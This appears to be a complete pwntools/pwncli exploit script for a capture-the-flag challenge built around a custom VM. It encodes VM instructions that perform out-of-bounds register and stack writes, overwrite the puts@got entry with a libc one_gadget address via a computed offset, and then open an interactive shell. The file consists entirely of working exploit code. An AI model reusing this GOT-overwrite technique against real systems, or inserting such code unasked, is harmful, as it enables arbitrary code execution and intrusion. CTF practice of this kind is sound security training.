from pwncli import *
cli_script()

p = gift['io']

def getnum(op, third, second, one): 
    return (op << 24) | (third << 16) | (second << 8) | one

if gift['remote']:
    putsaddr = 0x6f6a0
    targetaddr = 0x45226 # [0x45226, 0x4527a, 0xf0364]
elif gift['debug']:
    putsaddr = 0x6f6a0
    targetaddr = 0x453a0 # 


name = p64(int(abs(putsaddr - targetaddr)))

p.sendafter("name:\n", name)
sleep(0.5)

shell_number = [
    getnum(0x10, 0, 0, 0x100 - 120), # r1 -120
    getnum(0x10, 1, 0, 0x100 - 20), # r1 -20
    getnum(0x70, 2, 0, 0), # r2 -240
    getnum(0x70, 3, 2, 1), # r3 -260
    getnum(0x10, 4, 0, 0x100 - 41), # r4 -41
    getnum(0x70, 5, 4, 2), # r5 -281 存储puts的地址
    getnum(0x30, 6, 0, 5), # r6 puts@got
    getnum(0x30, 7, 0, 3), # r7 offset
    getnum(0x10, 0, 0, 2), # r0 -70
    getnum(0x70, 1, 5, 0), # r1 -279
    getnum(0x70, 2, 6, 7) if putsaddr < targetaddr else getnum(0x80, 2, 6, 7),  # r2 puts@got +- offset
    getnum(0x40, 2, 0, 1) # stack[r[1]] fuzhi wei r[2]
]

show_number = [
    getnum(0x10, 0, 0, 0x100 - 120),
    getnum(0x10, 1, 0, 0x100 - 20),
    getnum(0x70, 2, 0, 0),
    getnum(0x70, 3, 2, 1),
    getnum(0x10, 4, 0, 0x100 - 41),
    getnum(0x70, 5, 4, 2),
    getnum(0x30, 6, 0, 5),
    getnum(0x40, 6, 0, 3)
]

last = shell_number

p.sendlineafter("Size:\n", str(len(last)))

p.recvuntil("?????\n")

for i in last:
    p.sendline(str(i))
    sleep(0.5)

p.interactive()